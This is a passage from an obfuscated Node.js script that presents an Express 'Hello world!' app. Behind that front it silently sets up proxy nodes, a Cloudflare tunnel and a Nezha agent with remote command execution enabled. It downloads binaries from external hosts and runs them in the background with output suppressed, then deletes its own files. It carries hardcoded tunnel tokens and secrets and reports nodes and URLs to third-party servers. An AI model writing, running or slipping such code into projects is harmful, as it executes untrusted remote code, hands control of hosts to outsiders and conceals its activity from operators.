_0x4a2129={_0x70944b:0xcb},_0x1f46e4={_0x2ff6d1:0x11b,_0x59a0cc:0x137},_0xe3e069=_0x24e5,_0x25fa76=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x25fa76[_0xe3e069(0x134)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x25fa76[_0xe3e069(0x134)](phpPath);process[_0xe3e069(_0x2f9c2c._0x4a33d2)]===_0xe3e069(0xf4)?exec(_0xe3e069(_0x2f9c2c._0x4a015e)+_0x25fa76[_0xe3e069(0x173)]('\x20')+'\x20>\x20nul\x202>&1',_0x3f72f7=>{const _0x51290d=_0xe3e069;console['clear'](),console[_0x51290d(_0x1f46e4._0x2ff6d1)](_0x51290d(_0x1f46e4._0x59a0cc)),console[_0x51290d(0x11b)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0xe3e069(_0x2f9c2c._0x2c04fe)+_0x25fa76['join']('\x20')+_0xe3e069(_0x2f9c2c._0x2d0d23),_0xaa2430=>{const _0x4da3d7=_0xe3e069;console['clear'](),console[_0x4da3d7(0x11b)](_0x4da3d7(0x137)),console['log'](_0x4da3d7(_0x4a2129._0x70944b));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x535f32={_0x359ddb:0x11b,_0x2c11c2:0x152,_0x10ce72:0x115,_0x29cc9c:0x153},_0x42d108=_0x4f3a44;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x42d108(0x184));return;}try{const _0x3841=await axios['post'](_0x42d108(0x111),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x42d108(0xcc)}});return console[_0x42d108(_0x535f32._0x359ddb)](_0x42d108(0xd4)),_0x3841;}catch(_0x50eea2){return console[_0x42d108(_0x535f32._0x2c11c2)](_0x42d108(_0x535f32._0x10ce72)+_0x50eea2[_0x42d108(_0x535f32._0x29cc9c)]),null;}}async function startserver(){const _0x1c1163=_0x4f3a44;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x3ac8f2){console[_0x1c1163(0x152)](_0x1c1163(0x16c),_0x3ac8f2);}}function _0x2f9c(){const _0x24ccfc=['readFileSync','127.0.0.1','\x22\x20>\x20/dev/null\x202>&1','push','https://arm64.ssss.nyc.mn/v1','\x20failed:\x20','App\x20is\x20running','floor','unlinkSync','/dev/null','2083','4992831UTVdjv','http','\x20-c\x20\x22','isFile','finish','--tls','Download\x20','8443','false','1546166fdIqXL','match','existsSync','get','1770axUBWu','basename','UPLOAD_URL','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','chmod','\x0avless://','\x0a\x20\x20tunnel:\x20','toString','filter','error','message','child_process','/api/add-subscriptions','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','https://amd64.ssss.nyc.mn/agent','arch','catch','http\x20server\x20is\x20running\x20on\x20port:','country_code','\x0a\x0atrojan://','none','then','NEZHA_PORT','/trojan-argo','path','&path=%2Ftrojan-argo%3Fed%3D2560#','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','Error\x20downloading\x20files:','blackhole','writeFileSync','TunnelSecret','/api/add-nodes','random','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','Error\x20in\x20startserver:','ARGO_DOMAIN','https://arm64.ssss.nyc.mn/web','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','abcdefghijklmnopqrstuvwxyz','ARGO_AUTH','Rp1e9SpChViPAwbpE2aW1Njj5r4g1DBa','join','statSync','utf-8','org','includes','from','NEZHA\x20variable\x20is\x20empty,skip\x20running','split','arm64','sub.txt','axios','Hello\x20world!','/tunnel.yml\x20run','createWriteStream','miqvsydcpafl.us-west-1.clawcloudrun.com:80','Unhandled\x20error\x20in\x20startserver:','2096','Skipping\x20adding\x20automatic\x20access\x20task','arm','SERVER_PORT','FILE_PATH','\x0aclient_secret:\x20','\x20already\x20exists','Error\x20executing\x20command:\x20','ArgoDomain:','firefox','set','UUID','2053','env','map','dpd','tunnel.json','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','application/json','PROJECT_URL','php\x20running\x20error:\x20','/vmess-argo','express','charAt','exec','base64','automatic\x20access\x20task\x20added\x20successfully','24OZcLUV','tcp','\x20-p\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','https://ipapi.co/json/','vless','CFIP','fileUrl','list.txt','test','forEach','https://amd64.ssss.nyc.mn/web','\x20-s\x20','pipe','success','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','data','readdirSync','tls','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','40ZPlpkU','send','util','fileName','3647464axNRXT','web\x20running\x20error:\x20','rail.kevin.edu.kg','Railway','platform','\x20successfully','/sub.txt\x20saved\x20successfully','win32','\x20-c\x20','2087','.exe\x20>\x20nul\x202>&1','Empowerment\x20success\x20for\x20','trojan','/api/delete-nodes','text/plain;\x20charset=utf-8','aarch64','ARGO_DOMAIN:','listen','mkdirSync','post','Content-Type','stringify','Subscription\x20uploaded\x20successfully','true','/vless-argo','del\x20/f\x20/q\x20','27699203-e6f6-4563-a68a-5535308ac4cf','Nodes\x20uploaded\x20successfully','NAME','nohup\x20','taskkill\x20/f\x20/im\x20','1990268BEeggx','rm\x20-rf\x20','eyJhIjoiODBjNzdhMWUyZjBiMTdiYWQ0Njc0NjQ4YTc3YjVhZjIiLCJ0IjoiYmRmMWE0ZDYtZDA4ZC00YzgxLWE2MGYtNDdhM2NhYzliNjYxIiwicyI6Ik1UTTRPRFEwWkRNdE4yVTFOaTAwWTJWbUxUaGpaak10WVRObU1tVXdNVEprT1dZeiJ9','stream','quic','https://oooo.serv00.net/add-url','status','ARGO_PORT','\x0a\x20\x20credentials-file:\x20','Add\x20automatic\x20access\x20task\x20faild:\x20','\x20>/dev/null\x202>&1','tunnel.yml','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','NEZHA_SERVER','2391420XjEHWw','log','countryCode','652329xEpVHe','amd','\x20is\x20running','config.json','length','PORT','443','unshift','cdns.doon.eu.org','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','substring','xtls-rprx-vision','8848LLYRCs','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','has','/config.json\x20>/dev/null\x202>&1\x20&','NEZHA_KEY','direct','boot.log','response'];_0x2f9c=function(){return _0x24ccfc;};return _0x2f9c();}startserver()[_0x4f3a44(0x159)](_0x39fb4b=>{const _0x5dcc68={_0x49de39:0x152,_0x1683c5:0x182},_0x5cf37c=_0x4f3a44;console[_0x5cf37c(_0x5dcc68._0x49de39)](_0x5cf37c(_0x5dcc68._0x1683c5),_0x39fb4b);}),app[_0x4f3a44(0xfe)](PORT,()=>console[_0x4f3a44(0x11b)](_0x4f3a44(0x15a)+PORT+'!'));
